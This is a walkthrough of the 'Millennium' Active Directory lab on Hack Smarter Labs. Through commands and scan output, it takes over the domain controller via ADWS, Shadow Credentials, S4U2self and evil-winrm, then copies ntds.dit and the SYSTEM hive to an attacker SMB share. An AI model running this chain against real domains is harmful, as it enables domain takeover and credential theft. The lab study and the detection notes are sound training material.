# Millennium — Hack Smarter Labs Writeup

| | |
|---|---|
| **Difficulty** | Hard |
| **OS** | Windows Server 2022 (Build 10.0.20348) |
| **Domain** | `MILLENNIUM.CORP` |
| **DC** | `DC01.MILLENNIUM.CORP` (`10.0.19.54 `) |
| **Initial Access** | `MILLENNIUM.CORP\tester : Pencil Testers` |

<img width="1600" height="912" alt="8046c5e6-78fd-45b5-9dc5-9c93c15bf4e2" src="https://github.com/user-attachments/assets/7435ab15-f714-4f7f-9d70-ca9003b8f4a6" />

---

## 1. Scenario

Millennium Corp had a prior pentest that exposed **SMB (445)** and **LDAP (389)** as primary attack paths. In response, they deployed host-based firewall rules that **filter both ports**. You are placed inside the network under an assumed-breach model with only `tester`'s credentials. Objective: enumerate, escalate, and prove full domain compromise despite the hardened network controls.

> **Key insight:** this is not a "no ports open" lab — it's a *"the usual ports are closed"* lab. Everything hinges on finding an alternative channel.

---

## 2. Reconnaissance

Full TCP scan:

```
┌─[10.200.120.60]─[donmed@MyBitByte]─[~/LAB/Hacksmarter/Millennium]
└──╼ [★ ]$ sudo nmap -sCV -A -p- 10.0.19.54 -vv

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-11-21 11:47:07Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: MILLENNIUM.CORP0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.MILLENNIUM.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.MILLENNIUM.CORP
| Issuer: commonName=MILLENNIUM-DC01-CA/domainComponent=MILLENNIUM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-18T14:23:05
| Not valid after:  2027-06-18T14:23:05
| MD5:   38ba:95db:2ba3:5184:e790:56ed:5302:5b97
| SHA-1: 6899:b029:f564:f8a4:5cea:d0f0:8c72:df5d:3cb0:7921
| -----BEGIN CERTIFICATE-----
| MIIGTTCCBTWgAwIBAgITXwAAAAK/zstPTXYINwAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRQwEgYKCZImiZPyLGQBGRYEQ09SUDEaMBgGCgmSJomT8ixkARkWCk1JTExF
| Tk5JVU0xGzAZBgNVBAMTEk1JTExFTk5JVU0tREMwMS1DQTAeFw0yNjA2MTgxNDIz
| MDVaFw0yNzA2MTgxNDIzMDVaMB8xHTAbBgNVBAMTFERDMDEuTUlMTEVOTklVTS5D
| T1JQMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr2BxOedFfGQ+DWte
| 94WW3doiu3KPKJLi42f0xrgqWDvZ8tWkoKmJ5fm+k6Z8rJiGnZm+5JO6SmRo3emv
| IGdzAVJW3tWBfH9uF7iAl1S9jRkxWauAeTps24LSAe7gjED4zSKF9qYZukMO2Lyw
| GbyXchHwP32+3ZZuVDt1i9Vzix40IW5MVVTmw4FiixDMiWo21M2EZhCmeUPwTcJk
| ybKO/f/qiMmFvGoY0maXmqdtiH1GjY4/Nmgh9Zl/pzZ06czZifMFG8XMHsHHgu/o
| Knax9sSGQA0uPEf8KjB6nAvqRtJGTRPo0TsWLD9euyVffr3Jvmc6VO86o5fg4flU
| NH5BJQIDAQABo4IDUDCCA0wwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUs4kLgfMgvQmrnsgwzUvELijltMMwHwYDVR0jBBgwFoAU9YZ6taEAhUDg
| VhWjgl0yk3wloPQwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| TUlMTEVOTklVTS1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9TUlM
| TEVOTklVTSxEQz1DT1JQP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1NSUxMRU5OSVVNLURDMDEtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9TUlMTEVOTklVTSxEQz1DT1JQP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEEMagIITEjlDsARWA6+IqbyCFERDMDEuTUlM
| TEVOTklVTS5DT1JQME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5T
| LTEtNS0yMS0xNjkxMjQ2MjQyLTMxMTQ1MTQ3ODYtMTEyMTUwMDMwNC0xMDAwMA0G
| CSqGSIb3DQEBCwUAA4IBAQC/E5pH8KSpEFbGho7AMU0L2XpfqkXVcwqTL46/7rC8
| S5z7Z6AQa0Iv2IvGhpd9/7APZ93ElWNB16Ov2ctdAxNaIgl8BM1dF5NUhKENoU0u
| MYZSvWYU5mexxChe2pxflr4tM0TakMvgsZJeH0SQoM0X+BCjlROkz3rY/3cciOtJ
| qBzAmHt8hjRly6dUecmBi0UbkghUGh1ByjDaN/Vy6Si88QSZEADSPNpmIDZdy/RM
| 0FLBO0mdhnAyMrYdlx3PZRBjuVe8uX4CXJEzBUurmKkUCjuvfFx6dktBnA9f3w5K
| 77bXnaKuSQ+GsHdZAzYGZFpwYPj//l4gS3wjgoN2CoVB
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: MILLENNIUM.CORP0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.MILLENNIUM.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.MILLENNIUM.CORP
| Issuer: commonName=MILLENNIUM-DC01-CA/domainComponent=MILLENNIUM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-18T14:23:05
| Not valid after:  2027-06-18T14:23:05
| MD5:   38ba:95db:2ba3:5184:e790:56ed:5302:5b97
| SHA-1: 6899:b029:f564:f8a4:5cea:d0f0:8c72:df5d:3cb0:7921
| -----BEGIN CERTIFICATE-----
| MIIGTTCCBTWgAwIBAgITXwAAAAK/zstPTXYINwAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRQwEgYKCZImiZPyLGQBGRYEQ09SUDEaMBgGCgmSJomT8ixkARkWCk1JTExF
| Tk5JVU0xGzAZBgNVBAMTEk1JTExFTk5JVU0tREMwMS1DQTAeFw0yNjA2MTgxNDIz
| MDVaFw0yNzA2MTgxNDIzMDVaMB8xHTAbBgNVBAMTFERDMDEuTUlMTEVOTklVTS5D
| T1JQMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr2BxOedFfGQ+DWte
| 94WW3doiu3KPKJLi42f0xrgqWDvZ8tWkoKmJ5fm+k6Z8rJiGnZm+5JO6SmRo3emv
| IGdzAVJW3tWBfH9uF7iAl1S9jRkxWauAeTps24LSAe7gjED4zSKF9qYZukMO2Lyw
| GbyXchHwP32+3ZZuVDt1i9Vzix40IW5MVVTmw4FiixDMiWo21M2EZhCmeUPwTcJk
| ybKO/f/qiMmFvGoY0maXmqdtiH1GjY4/Nmgh9Zl/pzZ06czZifMFG8XMHsHHgu/o
| Knax9sSGQA0uPEf8KjB6nAvqRtJGTRPo0TsWLD9euyVffr3Jvmc6VO86o5fg4flU
| NH5BJQIDAQABo4IDUDCCA0wwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUs4kLgfMgvQmrnsgwzUvELijltMMwHwYDVR0jBBgwFoAU9YZ6taEAhUDg
| VhWjgl0yk3wloPQwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| TUlMTEVOTklVTS1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9TUlM
| TEVOTklVTSxEQz1DT1JQP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1NSUxMRU5OSVVNLURDMDEtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9TUlMTEVOTklVTSxEQz1DT1JQP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEEMagIITEjlDsARWA6+IqbyCFERDMDEuTUlM
| TEVOTklVTS5DT1JQME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5T
| LTEtNS0yMS0xNjkxMjQ2MjQyLTMxMTQ1MTQ3ODYtMTEyMTUwMDMwNC0xMDAwMA0G
| CSqGSIb3DQEBCwUAA4IBAQC/E5pH8KSpEFbGho7AMU0L2XpfqkXVcwqTL46/7rC8
| S5z7Z6AQa0Iv2IvGhpd9/7APZ93ElWNB16Ov2ctdAxNaIgl8BM1dF5NUhKENoU0u
| MYZSvWYU5mexxChe2pxflr4tM0TakMvgsZJeH0SQoM0X+BCjlROkz3rY/3cciOtJ
| qBzAmHt8hjRly6dUecmBi0UbkghUGh1ByjDaN/Vy6Si88QSZEADSPNpmIDZdy/RM
| 0FLBO0mdhnAyMrYdlx3PZRBjuVe8uX4CXJEzBUurmKkUCjuvfFx6dktBnA9f3w5K
| 77bXnaKuSQ+GsHdZAzYGZFpwYPj//l4gS3wjgoN2CoVB
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.MILLENNIUM.CORP
| Issuer: commonName=DC01.MILLENNIUM.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-20T11:37:38
| Not valid after:  2027-05-22T11:37:38
| MD5:   59a9:2d65:9807:6bb1:a53a:b9d6:8c2f:e07e
| SHA-1: 7615:3348:a8a4:9bdf:96d7:aa40:43ac:e8e1:cc05:a43f
| -----BEGIN CERTIFICATE-----
| MIIC7DCCAdSgAwIBAgIQJstooG0fhLRBu/2eYK3UmTANBgkqhkiG9w0BAQsFADAf
| MR0wGwYDVQQDExREQzAxLk1JTExFTk5JVU0uQ09SUDAeFw0yNjExMjAxMTM3Mzha
| Fw0yNzA1MjIxMTM3MzhaMB8xHTAbBgNVBAMTFERDMDEuTUlMTEVOTklVTS5DT1JQ
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy09etpg8pO9JHBkNJ8Cp
| /DMfXbEzvidGopyJ40IL8I6KGx22z6E3OHIBq3FnPtmnoAPmMq2t2r/sL8380F1B
| BWUI90WtUqceQ9rLbsUuAkW1bjkGkCdqu9A++JjO9fvJ38kaxCI8kbP9TzLToOQb
| nLRSH4ur19lphar4MN1gM9G71Y4/xpDJTbR7f82dpOXVMD/OFSQG1u+jyuV1RiEM
| mqUdB0B8BdxXXQhvCbs9yXDxIMHIJmPg8fLql1Id2LZeaCVcLZW/jatTNJYp9gaU
| rfaIOHGDGbEhY9jql7H68d31Loa/AI3x+2gQk4mXcs4F1c1rHBj5nsdfGPpyO87/
| iQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJ
| KoZIhvcNAQELBQADggEBAB1Vigi/yA9iC+0I9w/rmpcy1KsaOsSbL79NYzkJ579s
| 1bGqU04bFEMF32EGnXHXdgg3neOGckw0LmXcu+aCIcmF2bSPiBA/0/XJysCK3XFZ
| cja4FB3fJiNA6Ar3or8F0mi4NMF0sw9x8E6kjUdfcen249vKL+PTmTQjzHJR37QA
| RhR8z5hgzPUqiEG45wZsybicdkkC1hjyz4voIYFh63vlDa9mWxH5AVSlqW26gIrZ
| PXpI+oDLfW/3oIND8Yzp6rjlYtNxK+s7aDP9Y1X5ltuGF5AkcTDYWqbF5/nNvZbR
| uJKXPHJXnEurKZrjScCPTNXfX9nkz0WfxyuLjml4ULk=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: MILLENNIUM
|   NetBIOS_Domain_Name: MILLENNIUM
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: MILLENNIUM.CORP
|   DNS_Computer_Name: DC01.MILLENNIUM.CORP
|   Product_Version: 10.0.20348
|_  System_Time: 2026-11-21T11:48:05+00:00
|_ssl-date: 2026-11-21T11:48:44+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
52492/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
52505/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
52519/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
52536/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
52555/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

```

### Key findings

| Port | Service | Relevance |
|------|---------|-----------|
| 53 | DNS | Zone enumeration, name resolution |
| 88 | Kerberos | Authentication — **core channel** |
| 135 | MSRPC | RPC endpoint mapper |
| 139 | NetBIOS | SMB fallback (445 filtered) |
| 464 | kpasswd | Password change over Kerberos |
| 593 | RPC-over-HTTP | Exchange/RPC |
| 3268 | Global Catalog | LDAP GC — **filtered/blocked** |
| 3389 | RDP | Lateral movement |
| 5985 | WinRM | **HTTP-based remote management** |
| 9389 | **ADWS** | **The breakthrough** |

### Critical observations

- **Port 445 filtered** → NetExec SMB, `secretsdump` over SMB, share attacks are dead.
- **Port 389 filtered** → `BloodHound.py`, `bloodyAD`, `ldapsearch`, RustHound fail.
- **Port 9389 (ADWS)** → SOAP-based AD interface, **not firewalled**.
- **Port 5985 (WinRM)** → final shell target, supports Kerberos via HTTP SPN.
- Enterprise CA (`MILLENNIUM-DC01-CA`) present.

`/etc/hosts`:

```
10.0.19.54   DC01.MILLENNIUM.CORP MILLENNIUM.CORP DC01 MILLENNIUM-DC01-CA
```

### Confirming the blockage

```
nxc ldap DC01.MILLENNIUM.CORP -u 'tester' -p 'Pencil Testers'

# -> connection fails

bloodhound-ce.py -u 'tester' -p 'Pencil Testers' -d MILLENNIUM.CORP \
  -dc DC01.MILLENNIUM.CORP -ns 10.0.19.54  -c All --zip
# -> LDAP bind fails
```

---

## 3. Enumeration via ADWS (The Pivot)

**Active Directory Web Services (9389)** exposes AD over SOAP — a default DC service that is rarely firewalled. Two tools are central:

- **`Soaphound.py`** — BloodHound-compatible **collection** over ADWS (read-only).
- **`SOAPy`** — **enumeration and write operations** over ADWS, including Shadow Credentials and RBCD (by Logan Goins / IBM XFR).

### Install SOAPy

```
pipx install git+https://github.com/logangoins/SOAPy
```

### Collect BloodHound data over ADWS

```
soaphound -d MILLENNIUM.CORP -u tester -p 'Pencil Testers' \
  -dc DC01.MILLENNIUM.CORP -dc-ip 10.0.19.54  -c ADWSOnly --zip
```

Import the ZIP into BloodHound. **This works because ADWS listens on 9389, which was never firewalled.**

### BloodHound analysis — the attack path

| Principal | Right | Target |
|-----------|-------|--------|
| **Domain Users** | **GenericAll** | `sully` (user) |
| **sully** | **GenericWrite** | `DC01$` (DC computer account) |

- **Domain Users → GenericAll on `sully`:** `tester` (a Domain User) can take over `sully` (password reset or `msDS-KeyCredentialLink` write).
- **`sully` → GenericWrite on `DC01$`:** `sully` can write unprotected attributes on the DC machine account. Two paths:
  1. **RBCD** — write `msDS-AllowedToActOnBehalfOfOtherIdentity` on `DC01$`, then S4U2self/S4U2proxy to impersonate a DA.
  2. **Shadow Credentials** — write `msDS-KeyCredentialLink` on `DC01$`, PKINIT as `DC01$` to obtain its NT hash, enabling DCSync.

Target Domain Admin identified: **`athena`** (alongside `administrator`).

---

## 4. Access as sully — Shadow Credentials

### Why not just reset sully's password?

```
bloodyAD --host DC01.MILLENNIUM.CORP -d MILLENNIUM.CORP \
  -u 'tester' -p 'Pencil Testers' set password 'sully' 'Pwned123@!'
# -> fails: bloodyAD relies on LDAP, which is blocked
```

### Shadow Credentials against sully (over ADWS)

```
SOAPy MILLENNIUM.CORP/tester:'Pencil Testers'@DC01.MILLENNIUM.CORP \
  --shadow-creds add --shadow-target sully
```

Output: PFX (e.g. `GLpX0oup.pfx`) + password (`MWG4N5bBTkYHz3mRvGC4`).

### PKINIT as sully

```
certipy auth -pfx GLpX0oup.pfx -password 'MWG4N5bBTkYHz3mRvGC4' \
  -dc-ip 10.0.19.54  -domain MILLENNIUM.CORP -username sully
```

Returns **sully TGT** (`sully.ccache`) + **sully NT hash**.

### Verify Kerberos over ADWS

```
export KRB5CCNAME=sully.ccache
SOAPy MILLENNIUM.CORP/sully@DC01.MILLENNIUM.CORP -k --users
```

---

## 5. Shell as athena — Shadow Creds on DC01$ + S4U2self

### Step 1 — Shadow Credentials against the DC machine account

<img width="1105" height="502" alt="image" src="https://github.com/user-attachments/assets/14f181b9-6c50-4ef2-8cea-6c11af58ec99" />

```
export KRB5CCNAME=sully.ccache
SOAPy MILLENNIUM.CORP/sully@DC01.MILLENNIUM.CORP -k \
  --shadow-creds add --shadow-target 'DC01$'
```

Returns new PFX (`rJ9Fzi3x.pfx`) + password (`1QlI6KExHwO3reCgbtWD`).

### Step 2 — PKINIT as DC01$

```
certipy auth -pfx rJ9Fzi3x.pfx -password '1QlI6KExHwO3reCgbtWD' \
  -dc-ip 10.0.19.54  -domain MILLENNIUM.CORP -username 'DC01$'
```

Returns **DC01$ TGT** (`dc01.ccache`) + **DC01$ NT hash**.

```
export KRB5CCNAME=dc01.ccache
```

### Step 3 — S4U2self with `-altservice` to impersonate athena

A DC machine account may request service tickets for **any user** to itself via S4U2self. `getST.py` uses two critical flags:

- **`-self`** → S4U2self only (no S4U2proxy)
- **`-altservice`** → rewrite the SPN to `HTTP/` (needed for WinRM Kerberos auth)

```
getST.py -spn HTTP/DC01.MILLENNIUM.CORP -impersonate athena \
  -dc-ip 10.0.19.54  -k -no-pass \
  'MILLENNIUM.CORP/DC01$' -self -altservice HTTP/DC01.MILLENNIUM.CORP
```

Produces: `athena@HTTP_DC01.MILLENNIUM.CORP@MILLENNIUM.CORP.ccache`

### Step 4 — WinRM shell as athena

```
export KRB5CCNAME=athena@HTTP_DC01.MILLENNIUM.CORP@MILLENNIUM.CORP.ccache
evil-winrm -i DC01.MILLENNIUM.CORP -r MILLENNIUM.CORP
```

**Shell as `athena` (Domain Admin) on the DC. Done.**

> **Note:** RBCD was attempted via SOAPy but `getST.py`'s S4U2proxy impersonation errored with `KDC_ERR_ETYPE_NOSUPP`. The Shadow Credentials → S4U2self → `-altservice` path succeeded instead.

---

## 6. Post-Compromise — Dumping NTDS

Goal: **`krbtgt` hash** for full domain persistence (Golden Ticket).

SMB (445) still filtered, so `nxc smb --ntds` cannot be used directly. Use `ntdsutil` on the DC:

```
ntdsutil "activate instance ntds" "ifm" "create full C:\Users\ATHENA\Documents\NTDS" quit quit
```

### Exfiltrate

```
*Evil-WinRM* PS C:\Users\ATHENA\Documents\NTDS> Copy-Item "C:\Users\ATHENA\Documents\NTDS\Active Directory\ntds.dit' \\10.200.120.60\share\ntds.dit
*Evil-WinRM* PS C:\Users\ATHENA\Documents\NTDS> Copy-Item "C:\Users\ATHENA\Documents\NTDS\registry\system" \\10.200.120.60\share\system

```

> The `SYSTEM` hive from `ntdsutil` caused download issues, so it was re-saved manually via `reg save HKLM\SYSTEM system`, then downloaded.

### Offline secretsdump

```
secretsdump -ntds ntds.dit -system system LOCAL
```

→ **`krbtgt` NT hash extracted.** Full domain compromise achieved.

---

## 9. Key Takeaways

1. **Firewalling LDAP and SMB is not sufficient.** ADWS (9389) is a default DC service that exposes the same AD data and write operations over SOAP/HTTP.
2. **Shadow Credentials is the go-to when LDAP is blocked**: write to `msDS-KeyCredentialLink` over ADWS, then PKINIT (port 88) converts the cert into a TGT + NT hash. No SMB, no LDAP.
3. **GenericWrite on a DC computer object is a critical misconfiguration.** It enables Shadow Credentials or RBCD, both leading to domain compromise.
4. **S4U2self with `-self` + `-altservice`** is the correct technique when you control a DC machine account: request a ticket for any user to itself, then rewrite the SPN to `HTTP/` for WinRM.
5. **`ntdsutil IFM`** is a reliable on-host alternative to remote DCSync when SMB/RPC are blocked — dump `ntds.dit` + `SYSTEM` locally, parse offline.
6. **Detection gap:** writes to `msDS-KeyCredentialLink` on a DC computer object are high-severity events (`5136`). ADWS abuse is often missed because defenders focus on LDAP/SMB logs.

---
